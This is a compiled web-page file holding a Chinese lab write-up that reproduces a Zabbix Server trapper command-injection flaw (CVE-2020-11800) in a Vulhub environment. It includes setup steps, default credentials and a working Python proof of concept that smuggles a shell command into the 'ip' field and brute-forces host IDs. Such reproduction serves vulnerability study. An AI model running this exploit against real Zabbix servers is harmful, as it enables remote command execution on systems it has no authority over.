import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const u={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r={href:"https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2017-2824",target:"_blank",rel:"noopener noreferrer"},d=n("p",null,"参考链接：",-1),k={href:"https://xz.aliyun.com/t/8991",target:"_blank",rel:"noopener noreferrer"},b=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个完整的Zabbix环境，包含Web端、Server端、1个Agent和Mysql数据库：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>命令执行后，执行<code>docker-compose ps</code>查看容器是否全部成功启动，如果没有，可以尝试重新执行<code>docker-compose up -d</code>。</p>`,4),m=n("code",null,"admin/zabbix",-1),v={href:"https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2017-2824",target:"_blank",rel:"noopener noreferrer"},h=n("h2",{id:"漏洞复现",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞复现","aria-hidden":"true"},"#"),s(" 漏洞复现")],-1),_={href:"https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2017-2824",target:"_blank",rel:"noopener noreferrer"},g=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys


<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">10051</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>send<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&quot;request&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;active checks&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;host&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;vulhub&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;ip&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;ffff:::;touch /tmp/awesome_poc_2&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span> <span class="token number">10500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> send<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&quot;request&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;command&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;scriptid&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;hostid&quot;</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">and</span> <span class="token string">b&#39;failed&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;hostid: %d&#39;</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当查看到如下结果时，则说明命令执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031530752.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入server容器，可见<code>/tmp/awesome_poc_2</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031531690.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function f(x,y){const a=o("ExternalLinkIcon");return c(),i("div",null,[l,n("p",null,[s("Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。在"),n("a",r,[s("CVE-2017-2824"),t(a)]),s("中，其Server端 trapper command 功能存在一处代码执行漏洞，而修复补丁并不完善，导致可以利用IPv6进行绕过，注入任意命令。")]),d,n("ul",null,[n("li",null,[n("a",k,[s("https://xz.aliyun.com/t/8991"),t(a)])])]),b,n("p",null,[s("使用账号密码"),m,s("登录后台。利用该漏洞，需要你服务端开启了自动注册功能，开启方法请参考"),n("a",v,[s("CVE-2017-2824"),t(a)]),s("。")]),h,n("p",null,[s("修改"),n("a",_,[s("CVE-2017-2824"),t(a)]),s("的POC中的IP字段，构造新的POC：")]),g])}const V=p(u,[["render",f],["__file","Zabbix Server trapper命令注入漏洞 CVE-2020-11800.html.vue"]]);export{V as default};
